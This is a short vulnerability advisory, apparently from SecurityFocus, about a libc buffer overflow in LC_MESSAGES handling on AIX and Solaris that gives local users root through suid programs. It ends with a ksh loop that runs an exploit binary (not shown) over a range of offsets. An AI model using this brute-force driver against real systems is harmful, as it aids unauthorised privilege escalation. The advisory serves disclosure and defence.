source: https://www.securityfocus.com/bid/268/info

A buffer overflow in libc's handling of the LC_MESSAGES environment variable allows a malicious user to exploit any suid root program linked agains libc to obtain root privileges. This problem is found in both IBM's AIX and Sun Microsystem's Solaris. This vulnerability allows local users to gain root privileges.

#!/bin/ksh
L=3000
STEP=34
MAX=16000
while [ $L -lt $MAX ]
do
./a.out $L
L=`expr $L + $STEP`
done